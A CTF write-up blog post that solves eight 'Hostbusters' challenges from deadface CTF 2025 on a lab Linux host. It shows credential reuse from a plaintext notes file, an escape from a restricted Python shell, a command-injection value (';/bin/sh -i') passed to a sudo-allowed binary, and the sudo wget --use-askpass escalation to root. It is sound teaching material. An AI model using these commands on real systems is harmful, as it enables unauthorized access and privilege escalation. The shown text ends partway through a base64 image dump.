+++
title = "Who you gonna call? - HOSTBUSTERS"
author = "sol"
date = 2025-10-28
description = "Hostbusters was a unique challenge series in the 2025 edition of deadface CTF. It featured many aspects of reallife attacks that might be found in actual pentests. In this post we will look through all of the eight challenges."

[taxonomies]
tags = ["writeup", "deadface", "2025", "pentesting"]
+++

# cat hostbusters.md

Hostbusters was a unique challenge series in the 2025 edition of deadface CTF. 
It featured many aspects of reallife attacks chains that might be found in 
actual penetration tests. In this post we will look through all of the available 
eight challenges.

<center>
    <img src="../ghostbusters.gif" alt="Animated image of ghostbusters using 
    their proton pack">
</center>

{% alert(type="warning", icon="warning", title="Disclaimer") %}
The following writeup does not present how I solved the challenges during the 
event but rather a condensed and stylized version of it. I solved all challenges 
during the event but not necessarily in the exact same way. On inital access I 
performed my usual recon which revealed several flags in an order that does not 
follow the order presented here.
{% end %}

---

<center>
    <h1>Let Me In<h1>
</center>
{% alert(type="info", icon="info", title="Let Me In (5)") %}
Due to the efforts of the Turbo Tactical team, we’ve managed to acquire 
credentials belonging to gh0st404 that can be used on a remote DEADFACE machine. 
Access this machine and find the flag in the user’s home directory.


Submit the flag as `deadface{flag_text}`


IP Address: `hostbusters.deadface.io` <br/>
Username: `gh0st404` <br/>
Password: `ReadySetG0!` <br/>
{% end %}

Let's log-in with these credentials via ssh and see what we can get.

```shell,name=ssh gh0st404@hostbusters.deadface.io
Linux env03 6.1.0-40-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.153-1 (2025-09-20) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Oct 28 13:33:58 2025 from 173.34.11.244
~ $
```

Now that we are connected let us poke around the system.
{% alert(type="tip", icon="tip", title="Initial Access") %}
When I first land on a system I try to get the 'lay of the land', meaning I try 
to answer the following questions
- Who am I?
- Where am I?
- Who else is on the system?
- What files have I explicit rights over?
- What is running on the system?
- What ports are open?
- What are my rights on the overall system?
- [...]
{% end %}

I'll give you a short overview of this, but we will go into more detail on some
of these points in later sections.

```sh
whoami 
# gh0st404

groups 
# gh0st404

pwd 
# /home/gh0st404

cat /etc/passwd | grep sh$
# root:x:0:0:root:/root:/bin/sh
# gh0st404:x:1000:1000::/home/gh0st404:/bin/sh
# mirveal:x:1001:1001::/home/mirveal:/bin/sh
# deephax:x:1002:1002::/home/deephax:/usr/bin/dfsh

ls -la
# total 28
# drwxr-sr-x    1 gh0st404 gh0st404      4096 Oct 28 13:57 .
# drwxr-xr-x    1 root     root          4096 Sep 17 02:04 ..
# -rw-------    1 gh0st404 gh0st404        52 Oct 28 14:02 .ash_history
# -rw-r--r--    1 gh0st404 gh0st404       382 Sep 17 02:04 .dont_forget
# -rw-r--r--    1 gh0st404 gh0st404      1850 Sep 17 02:04 notes.txt
# drwxr-sr-x    1 gh0st404 gh0st404      4096 Sep 17 02:04 tools
```

Let's look at the first one of these files, namely `notes.txt`. I'll give you a
short excerpt here:

```sh,name=cat notes.txt,hl_lines=13
# [...]

Day 6 — 12:18 AM
Weird thing: their main site pushes traffic through Cloudflare, but half their
subdomains don’t. Split-brain security. Classic. Whoever set this up either cut
corners or didn’t know what the hell they were doing. Both work in my favor.

Day 7 — 01:45 AM
No break-ins yet — just circling the building, peeking in the windows. Feels
like De Monne wants me to think they’re solid. But I can see the cracks. Just
need the right pressure to make ‘em split.

deadface{hostbusters1_cf6a12ddf781cfbc}
```

And with this we get the first flag:

`deadface{hostbusters1_cf6a12ddf781cfbc}`

Not too hard, I dare to say. The poking around on the files system nicely
transitions us into the second challenge.

---

<center>
    <h1>Secret Stash<h1>
</center>
{% alert(type="info", icon="info", title="Secret Stash (8)") %}
Look around for files that gh0st404 might have hidden - he’s a novice DEADFACE 
member so we suspect he probably hides files in the simplest way.

Submit the flag as `deadface{flag_text}`.

ℹ️	Use the connection information from Hostbusters: Let Me In
{% end %}

We already looked at the first file we found (`notes.txt`) so obviously we 
should look at the other files as well. And as luck has it the second file we
look at `.dont_forget` has another flag:

```txt,name=cat .dont_forget,hl_lines=20
random junk, don’t lose this file (again)

[personal]
Gh0st!v3r$e_404
0nly_Sh4d0w_Kn0ws
n0scopez420!

[tools]
- burp:         waf_slayer$$
- metasploit:   c0d3BReaKer!
- vpn (alt):    4sh3s2dust_

[misc]
- music:      s1lent_echoes
- github:       b4ckd00rRabb1t
- deephax pen: Fr4gm3ntedSkull!!

# note to self: change the pen one (again)

deadface{hostbusters2_4685d0c801939781}
```

The content of the file looks like some kind of crude password managment
solution, a 'virtual post-it note' of some sort. At the end we also see our
second flag:

`deadface{hostbusters2_4685d0c801939781}`

---

<center>
    <h1>Et Cetera<h1>
</center>
{% alert(type="info", icon="info", title="Et Cetera (25)") %}
`gh0st404` is complaining in Ghost Town about his script not working. See if you 
can locate the script on the remote machine and read the flag.

Submit the flag as `deadface{flag_text}`.

ℹ️	Use the connection information from Hostbusters: Let Me In
{% end %}

This is the first time `Ghost Town` is mentioned. Ghost Town is a message board
/ forum-esque webpage that gives the players of the CTF hints, red herrings or
background on the story of the events. Here we see that gh0st404 was talking
about a script. So let's see if we can find what they were talking about.

Here is the first part of the forum posts:

{% alert(type="note", icon="note", title="gh0st404 - Bruh why is my script still broken 😤") %}

ok soooo i wrote this shell script to automate some log parsing junk right but 
when i try to run it, i keep getting `Permission Denied` <br/>
i thought maybe i was in the wrong folder or something, so i just moved it into 
`/etc/` cause that felt official or whatever <br/>
BUT IT STILL DENIED ME :sob:
<br/><br/>
like bro… it’s MY script… why is it betraying me<br/>
someone help before i rm -rf myself outta spite
{% end %}

The posts go on, talking about moving the file back into gh0st404's home and 
checking the permissions on the file. So let's try to find the script he was
talking about. I think the fastest way is to use the `find` command.

{% alert(type="tip", icon="tip", title="Using find") %}
`find` is a pretty useful and handy thing in your toolbox. The only problem with
it is that most people find it rather confusing. But don't scare away quickly.
Once understood it can do A LOT of heavy lifiting.

First of all you need to understand how the command is used:<br/>
`find <base_folder> <flags> 2>/dev/null`

It's important to always add the `2>/dev/null` at the end. This redirects all
errors (and find generates a lot of them) into /dev/null (basically the void).

Here are some useful find commands: <br/>
```sh
find / -iname '*something*' 2>/dev/null # Find a substring in a filename
find / -perms -4000 2>/dev/null # Find SUID binaries
find / -user some_user 2>/dev/null # Find files owned by some_user
find / -group some_group 2>/dev/null # Find files group owned by some_group
# ...
```
There is a ton more you can do with find. For example execute a command with the
found filename. If you want to know more you can read the manual page of find
with: `man find` or use the following link: 
[Linux find command](https://www.man7.org/linux/man-pages/man1/find.1.html) for
an online version of it.
{% end %}

Using find we can quickly \*\*find\*\* the file we are searching for:
```sh,name=find /etc/ -user gh0st404 2>/dev/null
/etc/logclean.sh
```

Let's try seeing it's content:
```sh,name=cat /etc/logclean.sh
cat: can't open '/etc/logclean.sh': Permission denied
```

We should have expected this as they were talking about permission issues 
before. So let's check the permissions on this file:

```sh,name=ls -la /etc/logclean.sh
----------    1 gh0st404 gh0st404       552 Sep 17 02:04 /etc/logclean.sh
```

We see that we own the file fully (user and group) but interestingly there are
no permission granted for that file. Let's change the permission so we can read
it with: <br/>
`chmod +r /etc/logclean.sh`<br/>

Doing a `ls` again we see that we now have read rights for that file and can
read it:
```sh,name=ls -la /etc/logclean.sh
-r--r--r--    1 gh0st404 gh0st404       552 Sep 17 02:04 /etc/logclean.sh
```

```sh,name=cat /etc/logclean.sh,hl_lines=10
# [...]

echo "[*] zeroing logs (local only)..."
for log in /var/log/*.log; do
    [ -f "$log" ] && cat /dev/null > "$log"
done

echo "[*] cleaning done. ghost mode re-enabled."

echo "deadface{hostbusters3_0547796725934bbd}"
```
I cut of the file at the beginning a bit because it is not really interesting.
More interesting though is that we find our third flag in it:

`deadface{hostbusters3_0547796725934bbd}`

---

<center>
    <h1>Lay of the Land<h1>
</center>
{% alert(type="info", icon="info", title="Lay of the Land (70)") %}
Scope out and continue characterizing the host. What are some of the characters 
of this environment? Find the flag associated with `hostbusters4`.

Submit the flag as `deadface{flag_text}`

ℹ️	Use the connection information from Hostbusters: Let Me In
{% end %}

This flag was pretty easy and I found it really early on. The challenge
description also gives us a big hint: `What are some of the characters 
of this environment?`

Let's run the `env` command and see what the output gets us:
```sh,name=env,hl_lines=5
USER=gh0st404
SHLVL=2
HOME=/home/gh0st404
PAGER=less
flag=deadface{hostbusters4_c6e54afa62741d34}
LOGNAME=gh0st404
TERM=xterm
LC_COLLATE=C
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
LANG=C.UTF-8
SHELL=/bin/sh
PWD=/home/gh0st404
CHARSET=UTF-8
```

Without much searching this gave us our fourth flag:

`deadface{hostbusters4_c6e54afa62741d34}`

---

<center>
    <h1>Worldwide<h1>
</center>
{% alert(type="info", icon="info", title="Worldwide (100)") %}
The system seems to have multiple users, one of which is `deephax`. There’s a 
GhostTown thread between `gh0st404` and deephax talking about a `pen-console.py` 
being `deephax`’s default shell. He also mentions giving `gh0st404` his 
password. Look around the machine and see if you escalate laterally to 
`deephax`’s account. There may be information we can use (i.e., flag) in 
`deephax`’s shell environment.

Submit the flag as `deadface{flag_text}`.

ℹ️	Use the connection information from Hostbusters: Let Me In
{% end %}

Before we search for deephax's password let us first see what this 
`pen-console.py` is. We use find to search for it again:
```sh,name=find / -iname 'pen-console.py' 2>/dev/null,
/usr/local/bin/pen-console.py
```
And now we get the content:
```py,name=cat /usr/local/bin/pen-console.py,hl_lines=10
#!/usr/bin/python3

import cmd
import os
import hashlib
import base64
import subprocess
from cryptography.fernet import Fernet  # you need this: pip install cryptography

flag="deadface{hostbusters5_e16a5c8995620a24}"

class DeephaxConsole(cmd.Cmd):
    intro = "YO welcome to deephax’s red team console 🔥 type 'help' for commands or whatever. let’s HAX! 💀"
    prompt = '(deephax)> '

    def do_hash(self, arg):
        """hash <string>: gimme a string, i spit hashes back at ya."""
        if not arg:
            print("bruh... gimme sumthin to hash!! 😤")
            return
        print(f"MD5: {hashlib.md5(arg.encode()).hexdigest()}")
        print(f"SHA1: {hashlib.sha1(arg.encode()).hexdigest()}")
        print(f"SHA256: {hashlib.sha256(arg.encode()).hexdigest()}")

    def do_encrypt(self, arg):
        """encrypt <message>: encrypts ur message wit Fernet 🔐"""
        if not arg:
            print("what u tryna lock up? type somethin! 🗝️")
            return
        key = Fernet.generate_key()
        cipher = Fernet(key)
        encrypted = cipher.encrypt(arg.encode())
        print(f"here's ur key (DON'T LOSE IT): {key.decode()}")
        print(f"and here’s ur encrypted junk: {encrypted.decode()}")

    # Here are some more methods
    # [...]

    def do_quit(self, arg):
        """yeet outta this console."""
        print("PEACE OUT - deephax out ✌️")
        return True

if __name__ == '__main__':
    DeephaxConsole().cmdloop()
```

This gives use our next flag.

`deadface{hostbusters5_e16a5c8995620a24}`

But we were also told that we should escalate our privilege to deephax. So let's 
try to exactly that, it might get useful in the future.

## Lateral Movement to deephax

We should check the mentioned Ghost Town posts again. Maybe this gives us more
information. This is the most interesting one:

{% alert(type="note", icon="note", title="deephax - Help with pen-console") %}

yeeeah buddy :joy: <br/>
u’ll see a lil banner when it loads. type help if u get lost. it runs recon, 
scans, etc :eyes: <br/>
i sent u my passwd keep it somewhere safe <br>
{% end %}

So gh0st404 has the password of deephax. Nothing new, but does that ring a bell?

For everyone who hasn't got it by now, here is the 'solution'. We found a 
'virtual post-it note' and it has the following line in
it:
```txt,name=cat /home/gh0st404/.dont_forget,hl_lines=16
random junk, don’t lose this file (again)

[personal]
Gh0st!v3r$e_404
0nly_Sh4d0w_Kn0ws
n0scopez420!

[tools]
- burp:         waf_slayer$$
- metasploit:   c0d3BReaKer!
- vpn (alt):    4sh3s2dust_

[misc]
- music:      s1lent_echoes
- github:       b4ckd00rRabb1t
- deephax pen: Fr4gm3ntedSkull!!

# note to self: change the pen one (again)

deadface{hostbusters2_4685d0c801939781}
```
This is the password for `deephax`. 

Let's use `su` to change our user to them. After entering the password we see 
this:
```sh,name=su - deephax
YO welcome to deephax’s red team console 🔥 type 'help' for commands or whatever. let’s HAX! 💀
(deephax)>
```

So we are running inside the python programm we've seen before. Let's open 
another ssh session and take a closer look at how the code is working:

{% alert(type="warning", icon="warning", title="Dockerized SSH") %}
Because each ssh session is dockerized in its own container we can not connect
again to the same container.
{% end %}

```py,name=cat /usr/local/bin/pen-console.py
import cmd
# more imports

class DeephaxConsole(cmd.Cmd):
    intro = "YO welcome to deephax’s red team console 🔥 type 'help' for commands or whatever. let’s HAX! 💀"
    prompt = '(deephax)> '


    # Here are some more methods
    # [...]

    def do_quit(self, arg):
        """yeet outta this console."""
        print("PEACE OUT - deephax out ✌️")
        return True

if __name__ == '__main__':
    DeephaxConsole().cmdloop()
```
I cut down the code to the most important parts. Its running a `cmdloop` from
the `cmd` module. Thats basically it. Let's go to the 
[documentation](https://docs.python.org/3/library/cmd.html) and read up on what
it is doing exactly.

Nothing too interesting. Let's see what shell would be run if we login as 
deephax with `/etc/passwd`:
```txt,name=cat /etc/passwd | grep sh$,hl_lines=4
root:x:0:0:root:/root:/bin/sh
gh0st404:x:1000:1000::/home/gh0st404:/bin/sh
mirveal:x:1001:1001::/home/mirveal:/bin/sh
deephax:x:1002:1002::/home/deephax:/usr/bin/dfsh
```

We see it starts `dfsh`. This is no default shell I (or Google) knows of. This
is weird, because we have seen that we are running the python file. Let's play
around with the shell. Let's list all commands with `help`
```sh,name=help

Documented commands (type help <topic>):
========================================
base64  decrypt  encrypt  forensics  hash  help  quit  recon

(deephax)>
```

Let's play around with some:
```sh,name=base64 encode test
(deephax)>base64 encode test
dGVzdA==
(deephax)>
```

```sh,name=base64 decode dGVzdA==
(deephax)>base64 decode dGVzdA==
test
(deephax)>
```

Ok, so we can base64 encode and decode strings. What else looks interesting?
What about `recon` and `forensics`

```sh,name=recon
(deephax)>recon
yo i need an IP 😑
(deephax)>
```

```sh,name=recon 127.0.0.1
(deephax)>recon 127.0.0.1
nmap ain't even installed??? WACK.
(deephax)>
```

```sh,name=forensics
(deephax)>forensics
what file u want me 2 peek at? 👀
(deephax)>
```

```sh,name=forensics /etc/passwd
(deephax)>forensics /etc/passwd
Traceback (most recent call last):
  File "/usr/local/bin/pen-console.py", line 102, in <module>
    DeephaxConsole().cmdloop()
  File "/usr/lib/python3.12/cmd.py", line 138, in cmdloop
    stop = self.onecmd(line)
           ^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.12/cmd.py", line 217, in onecmd
    return func(arg)
           ^^^^^^^^^
  File "/usr/local/bin/pen-console.py", line 88, in do_forensics
    file_type = subprocess.run(['file', arg], capture_output=True, text=True).stdout.strip()
                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.12/subprocess.py", line 548, in run
    with Popen(*popenargs, **kwargs) as process:
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.12/subprocess.py", line 1026, in __init__
    self._execute_child(args, executable, preexec_fn, close_fds,
  File "/usr/lib/python3.12/subprocess.py", line 1955, in _execute_child
    raise child_exception_type(errno_num, err_msg, err_filename)
FileNotFoundError: [Errno 2] No such file or directory: 'file'
>>>
```

???

The shell crashed and we are in a python REPL now. REPL means read-eval-print
loop and is the interactive python interpreter. Most importantly it gives us
FULL access to ALL of python. Let's start a normal shell and see why this 
happened:</br>
`import os;os.system('/bin/sh -i')`

First let's look at the shell that we started when we connected:
```sh,name=cat /usr/bin/dfsh
#!/bin/sh
python3 -i /usr/local/bin/pen-console.py
```

This explains a lot as `python -i` runs a interactive shell and gives you are 
REPL whenever the programm finishes.
```txt,name=python --help
-i     : inspect interactively after running script; forces a prompt even
         if stdin does not appear to be a terminal; also PYTHONINSPECT=x
```

This means no matter how we quit / crash the programm we get the REPL. This 
actually happend for me on accident because I tried to quit the shell with
<kbd>CTRL</kbd>-<kbd>C</kbd> and got into the interactive python interpreter.
Another way to achieve this is to type `quit` in the `pen-console.py` shell.

---

<center>
    <h1>Pulse Check<h1>
</center>
{% alert(type="info", icon="info", title="Pulse Check (125)") %}
What is this machine doing? Our team has looked in various files and we can’t 
seem to locate the 7th flag. Maybe we need to characterize this host more.

Submit the flag as `deadface{flag_text}`.

ℹ️	Use the connection information from Hostbusters: Let Me In
{% end %}

So this is all about searching for the flag somewhere 'on' the system. To
achieve this let's first start by trying to grab all flags we have access to
on the system. Note: I will be using the deephax user here.

```sh,name=grep -r 'deadface' / 2>/dev/null
/home/deephax/.ash_history:grep -r 'deadface' / 2>/dev/null
/home/gh0st404/.dont_forget:deadface{hostbusters2_4685d0c801939781}
/home/gh0st404/notes.txt:deadface{hostbusters1_cf6a12ddf781cfbc}
/usr/local/bin/pen-console.py:flag="deadface{hostbusters5_e16a5c8995620a24}"
/etc/logclean.sh:echo "deadface{hostbusters3_0547796725934bbd}"
```

I did not let this command finish as it took quite a long time but this is
basically all it finds. The reason why we can not find any new flags here can be
varied. It could be that the flag is encoded or encrypted, we have no read
access to the file, or the flag is only accessible on another machine via the
network. There are probably more ways how it is possible to not find the flag
but these are the main reasons in my opinion. Let's look at the network with
`netstat`

```sh,name=nestat -tulpn
netstat: can't scan /proc - are you root?
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
udp        0      0 0.0.0.0:37514           0.0.0.0:*                           -
```

There is one UDP port, but if we connect to it via nc we don't get anything back
and when we quit we only get this: `punt!`. But we also see that we might not
have the full picture because as it says `can't scan /proc - are you root?`. We
are not root see every listening port. Let's try listing what processes are
running:

```sh,name=ps aux
PID   USER     TIME  COMMAND
    1 gh0st404  0:00 /bin/sh
    7 root      0:00 /usr/bin/dfcheckalive
   49 deephax   0:00 {dfsh} /bin/sh /usr/bin/dfsh
   50 deephax   0:00 python3 -i /usr/local/bin/pen-console.py
   53 deephax   0:00 /bin/sh -i
   69 deephax   0:00 ps aux
```

Everything except that root process are expected as we started them.

{% alert(type="tip", icon="tip", title="Using find") %}
You might wonder why there are so few processes shown, because usually you would
see many more. This can have two reasons.
1. We are in a docker container and docker has just not a lot of processes
running. Try it yourself. Spin up a container, type `ps aux` and see the few
processes that are running.
2. `hidepid=2` is enable in `/etc/fstab`. The `hidepid=2` option in fstab is
used to restrict access to the process info of other users. Thus you can only
see your own processes.

Quick Quiz Question: <br/>
With just the information I showed you, can you tell me if the `hidepid` option
is set to two in /etc/fstab?
{% end %}

Let's check what this programm `dfcheckalive` is. 

```sh,name=ls -la /usr/bin/dfcheckalive
-rwxr-xr-x    1 deephax  deephax      19464 Sep 17 02:04 /usr/bin/dfcheckalive
```

Ok so we have full access to this file. I would normally use the `file` utility
on the file to find out what type of file this is but it is not available in the
docker container. Thus I will use the `strings` programm:

```txt,name=strings dfcheckalive
T/lib/ld-musl-x86_64.so.1
socket
exit
htons
fopen
strncmp
perror
strncpy
puts
__stack_chk_fail
inet_pton
statvfs
fgets
strlen
...
```
Here are the first view lines of the output. We see that this is probably a ELF
(binary) file. Normally I would now pull it to my machine and analyze it but
this is a CTF so let's just run it on the machine. After all it's not our
machine we would break.

```txt,name=dfcheckalive
Starting DEADFACE 'Alive' Reporter (dfcheckalive)...
Sending host status JSON to 127.0.0.1:4343 every 5 seconds.
```

Ok, so this is what `root` is running. Lets try listening for the content:

```sh,name=nc -lvnp 4343
listening on [::]:4343 ...
```

But nothing is send to our end. Maybe it's not a TCP socket. We could easily
find what it is doing using `strace` or `ltrace` but before we put our time into
this on the CTF we could also just try UDP instead:

```sh,name=nc -lvnup 4343
listening on [::]:4343 ...
connect to [::ffff:127.0.0.1]:4343 from [::ffff:127.0.0.1]:37514 ([::ffff:127.0.0.1]:37514)
{"status":"alive","flag":"deadface{hostbusters7_d8c0a4c4e64a5b78}","host":{"hostname":"hostbusters","ip":"0.0.0.0","disk_gb":157,"mem_gb":7}}
```

After a second or two we get a connection back. And hey look at that, the next
flag.

`deadface{hostbusters7_d8c0a4c4e64a5b78}`

Let's hop to the next challenge

---

<center>
    <h1>Read 'Em and Weep<h1>
</center>
{% alert(type="info", icon="info", title="Read 'Em and Weep (300)") %}
`mirveal` has an encrypted file on the system that we need access to. Find a way
to read the `hostbusters6.bin` file.

Submit the flag as `deadface{flag_text}`.

ℹ️	Use the connection information from Hostbusters: Let Me In
{% end %}

Let's first find the files they are talking about by going to the home directory
of `mirveal`: `cd /home/mirveal`

```sh,name=ls -la,hl_lines=4
drwxr-sr-x    1 mirveal  mirveal       4096 Sep 17 02:04 .
drwxr-xr-x    1 root     root          4096 Sep 17 02:04 ..
drwxr-sr-x    1 mirveal  mirveal       4096 Sep 17 02:04 .keys
-rw-r--r--    1 mirveal  mirveal        256 Sep 17 02:04 hostbusters6.bin
```

We see the mentioned file: `hostbusters6.bin`. We also see a `.keys` directory.
Let's `cd` into it and list all the files

```sh,name=ls -la,hl_lines=4
drwxr-sr-x    1 mirveal  mirveal       4096 Sep 17 02:04 .
drwxr-sr-x    1 mirveal  mirveal       4096 Sep 17 02:04 ..
-rw-------    1 mirveal  mirveal       1704 Sep 17 02:04 private.pem
-rw-r--r--    1 mirveal  mirveal        451 Sep 17 02:04 public.pem
```

We see a public:private key pair. But only the public key is accessible. I 
believed the crypto might be good so the only way to get our hands onto the flag
was to get access to the mirveal user. 

{% alert(type="tip", icon="tip", title="Privilege Escalation and Lateral Movement") %}
Privilege escalation and lateral movement can be quite hard. There are many
paths to escalate your privilege and thousands of things you need to know to 
consider all ways you could exploit your way up the ladder. Here are some quick
hints for what to look for:

1. Check SUID binaries
2. Check GUID binaries
3. Check sudo rights
4. Check running services / processes
5. Check kernel version
6. Credential reuse
7. Linux capabilities
8. Path / library injection
9. ... and many more ...

For linux you can use the 
[linpeas](https://github.com/peass-ng/PEASS-ng/blob/master/linPEAS/README.md)
script to enumerate a lot of ways you could escalate your privilege.
{% end %}

We will take a look at our sudo rights. Let's list them with `sudo -l`:

```sh,name=sudo -l
Matching Defaults entries for deephax on hostbusters:
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for deephax:
    Defaults!/usr/sbin/visudo env_keep+="SUDO_EDITOR EDITOR VISUAL"

User deephax may run the following commands on hostbusters:
    (mirveal) NOPASSWD: /usr/bin/logviewer *
```

OK nice, we can run a script as `mirveal`. Let's see what the permission on the 
script are:

```sh,name=ls -la /usr/bin/logviewer
-rwxr-xr-x    1 mirveal  admins       18488 Sep 17 02:04 /usr/bin/logviewer
```

`deephax` is not in the admins group. This means we can not change the file.
Let's see what typo of file we are dealing with to get a better idea of what
we are dealing with:

```txt,name=strings /usr/bin/logviewer
/lib/ld-musl-x86_64.so.1
__stack_chk_fail
system
_init
_fini
__cxa_finalize
__libc_start_main
snprintf
libc.musl-x86_64.so.1
__deregister_frame_info
...
__register_frame_info
uGUH
t&UH
Usage: %s <logfile_pattern>
ls -l /var/log/%s
;*3$"
GCC: (Alpine 14.2.0) 14.2.0
_init
...
```

I again cut out some lines because the output is quite long. We see that this is
a ELF file again. Let's run it and see what it does:

```sh,name=/usr/bin/logviewer
Usage: /usr/bin/logviewer <logfile_pattern>
```

Let's specify a file:

```sh,name=/usr/bin/logviewer /etc/passwd
ls: /var/log//etc/passwd: No such file or directory
```

So this is running `ls`. Which we can verify also by looking in the `strings`
output:
```txt,name=strings /usr/bin/logviewer,hl_lines=16
/lib/ld-musl-x86_64.so.1
__stack_chk_fail
system
_init
_fini
__cxa_finalize
__libc_start_main
snprintf
libc.musl-x86_64.so.1
__deregister_frame_info
...
__register_frame_info
uGUH
t&UH
Usage: %s <logfile_pattern>
ls -l /var/log/%s
;*3$"
GCC: (Alpine 14.2.0) 14.2.0
_init
...
```

If there is no sanitization we might be able to inject into the commandline it
is running. Let's try,
```sh
;cat /etc/passwd
```
as the file.

```sh,name=/usr/bin/logviewer ;cat /etc/passwd
Usage: /usr/bin/logviewer <logfile_pattern>
root:x:0:0:root:/root:/bin/sh
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
klogd:x:100:101:klogd:/dev/null:/sbin/nologin
gh0st404:x:1000:1000::/home/gh0st404:/bin/sh
mirveal:x:1001:1001::/home/mirveal:/bin/sh
deephax:x:1002:1002::/home/deephax:/usr/bin/dfsh
```

This means we have `command injection`. Let's try spawing a shell with sudo now:
```sh
sudo -u mirveal /usr/bin/logviewer ';/bin/sh -i'
```

Awesome we are mirveal now. We can use openssl now to decrypt the file:
```sh
openssl pkeyutl -in hostbusters6.bin -inkey .keys/private.pem -decrypt -pkeyopt rsa_padding_mode:pkcs1 -out flag.txt
```

This gives us our second to last flag:

```sh,name=cat flag.txt
deadface{hostbusters6_d22a1c03f3454b9c}
```

Let's go for a sprint on the final stretch and slay this beast of a machine!

---

<center>
    <h1>I Am Root<h1>
</center>
{% alert(type="info", icon="info", title="I am Root (400)") %}
There’s an image on the machine that contains sensitive information belonging to 
our client: Lytton Labs. The only problem is that it’s owned by root. Find a way 
to access the JPG image that belongs to root.

Submit the flag as `deadface{flag_text}`.

ℹ️	Use the connection information from Hostbusters: Let Me In
{% end %}

We start with similar enumeration as we did before. Let's list our sudo right:

```sh,name=sudo -l
Matching Defaults entries for mirveal on hostbusters:
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for mirveal:
    Defaults!/usr/sbin/visudo env_keep+="SUDO_EDITOR EDITOR VISUAL"

User mirveal may run the following commands on hostbusters:
    (ALL) ALL
    (ALL) NOPASSWD: /usr/bin/wget
```

We technically can run anything as root, as long as we know `mirveal`'s
password, which we don't. So let's focus on the second part of the sudo output:
```
(ALL) NOPASSWD: /usr/bin/wget
```

We can use a online tool called [GTFOBins](https://gtfobins.github.io) to check
if there are any know ways to escalate our privilege with this binary. Nice, we
get a hit with wget. Let's follow the tutorial for sudo:

{% alert(type="note", icon="note", title="GTFOBins - wget") %}
### Sudo
If the binary is allowed to run as superuser by `sudo`, it does not drop the 
elevated privileges and may be used to access the file system, escalate or 
maintain privileged access.

```sh
TF=$(mktemp)
chmod +x $TF
echo -e '#!/bin/sh\n/bin/sh 1>&0' >$TF
sudo wget --use-askpass=$TF 0
```
{% end %}

{% alert(type="tip", icon="tip", title="wget - Privesc explained") %}
You might wonder how this privilege escalation works. It is actually pretty
simple.  First let's check the `--use-askpass` flag:
```sh,name=wget --help
# [...]
--use-askpass=COMMAND       specify credential handler for requesting
# [...]
```
We see that the `--use-askpass` just takes a command for credential handling.

We could technically use `/bin/sh` as the command but `--use-askpass` passes
parameter on the commandline which break the shell spawing. Thus we create a
file with our shell spawning command and then give this script as the askpass
command. This consumes all parameters and throws them away. The rest is just 
fluff to make it the file in a tempfile:
``sh
TF=$(mktemp) # Make temporary file
chmod +x $TF # Make the file executable
echo -e '#!/bin/sh\n/bin/sh 1>&0' >$TF # Put our shell spawning command in it
sudo wget --use-askpass=$TF 0 # Runn the command
```

The `1>&0` just redirects stdout to stdin. I am not exactly sure why this is 
done but I know if we don't do it we can't see the output of our commands. I
probably has something to do with how wget interacts with stdin and stdout.
{% end %}

Let's run the mentioned script.

```sh,name=whoami
root
```

So we are root. We've done it! Let's get the image onto our machine. We can't
put any ssh public key in because when we connect with another session another
docker container is run, without our added key. So we can't use scp. The
'easiest' way to do this for me was to base64 encode the image copy all over 
and decode it again:
```txt,name=cat IMG_202509161627.jpg | base64
/9j/4QBORXhpZgAATU0AKgAAAAgAAwEaAAUAAAABAAAAMgEbAAUAAAABAAAAOgEoAAMAAAABAAIA
AAAAAAAACvyAAAAnEAAK/IAAACcQAAAAAP/tAEBQaG90b3Nob3AgMy4wADhCSU0EBgAAAAAABwAG
AQEAAQEAOEJJTQQlAAAAAAAQAAAAAAAAAAAAAAAAAAAAAP/uACFBZG9iZQBkQAAAAAEDABADAgMG
AAAAAAAAAAAAAAAA/9sAhAACAgICAgICAgICAwICAgMEAwICAwQFBAQEBAQFBgUFBQUFBQYGBwcI
BwcGCQkKCgkJDAwMDAwMDAwMDAwMDAwMAQMDAwUEBQkGBgkNCgkKDQ8ODg4ODw8MDAwMDA8PDAwM
DAwMDwwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAz/wgARCAHgAiADAREAAhEBAxEB/8QA6wAA
AQQDAQEBAAAAAAAAAAAAAgEDBAUABgcICQoBAQEBAQEBAQEAAAAAAAAAAAABAgMEBQYHEAABAwMD
AwMDAwQDAQEAAAABAAIDEQQFEAYHICESMRMIMEAiUEEUMiMVCTMWFyQYEQABAwIEAwUEBwUGBAQF
BQABEQIDAAQhMRIFQVEGEGFxIhOBkTIHIKGxwUIjFPDRUjMVMOFicoIk8UMWCJKyUxeiwjREJWNz
